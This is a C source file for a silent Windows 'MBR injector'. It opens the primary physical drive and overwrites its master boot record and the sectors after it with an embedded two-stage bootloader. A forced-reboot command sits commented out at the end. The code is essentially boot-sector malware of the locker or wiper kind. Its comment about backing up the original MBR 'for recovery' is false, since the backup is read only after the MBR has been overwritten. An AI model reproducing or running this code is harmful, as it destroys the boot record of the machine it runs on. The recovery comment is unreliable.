// main.c - MBR Injector with embedded bootloader (Two-Stage)
// Silent version - no console output
#include <windows.h>

// Bootloader binaries included from header files
#include "boot_data.h"
#include "stage2_data.h"

int main() {
    HANDLE hDrive;
    DWORD bytesWritten;
    BOOL result;
    
    // Try to open PhysicalDrive0 (primary drive)
    hDrive = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    // If failed, try PhysicalDrive1
    if (hDrive == INVALID_HANDLE_VALUE) {
        hDrive = CreateFileA(
            "\\\\.\\PhysicalDrive1",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
    }
    
    if (hDrive == INVALID_HANDLE_VALUE) {
        return 1; // Failed to open drive
    }
    
    // Verify stage1 bootloader size is 512 bytes
    if (boot_bin_len != 512) {
        CloseHandle(hDrive);
        return 2;
    }
    
    // Verify stage2 size is multiple of 512 bytes
    if ((stage2_bin_len % 512) != 0) {
        CloseHandle(hDrive);
        return 3;
    }
    
    // Write stage1 bootloader to MBR (sector 0)
    result = WriteFile(
        hDrive,
        boot_bin,
        boot_bin_len,
        &bytesWritten,
        NULL
    );
    
    if (!result) {
        CloseHandle(hDrive);
        return 4;
    }
    
    // FIX HERE:
// BIOS counts sectors starting at 1 (1=MBR, 2=Stage2).
// Byte-wise, Sector 2 starts at offset 512.
    LARGE_INTEGER stage2Pos;
    stage2Pos.QuadPart = 512 * 1; // Points to the 512th byte (Start of Sector 2)
    
    SetFilePointer(
        hDrive,
        stage2Pos.LowPart,
        &stage2Pos.HighPart,
        FILE_BEGIN
    );
    
    result = WriteFile(
        hDrive,
        stage2_bin,
        stage2_bin_len,
        &bytesWritten,
        NULL
    );
    
    if (!result) {
        CloseHandle(hDrive);
        return 5;
    }
    
    // Write backup of original MBR to sector 6 (for recovery)
    // Read current MBR first
    unsigned char originalMBR[512];
    SetFilePointer(hDrive, 0, NULL, FILE_BEGIN);
    ReadFile(hDrive, originalMBR, 512, &bytesWritten, NULL);
    
    // Write backup
    LARGE_INTEGER backupPos;
    backupPos.QuadPart = 512 * 6; // Sector 6
    SetFilePointer(hDrive, backupPos.LowPart, &backupPos.HighPart, FILE_BEGIN);
    WriteFile(hDrive, originalMBR, 512, &bytesWritten, NULL);
    
    // Flush and close
    FlushFileBuffers(hDrive);
    CloseHandle(hDrive);
    
    // Restart computer (uncomment to enable)
    // system("shutdown /r /f /t 0");
    
    return 0;
}
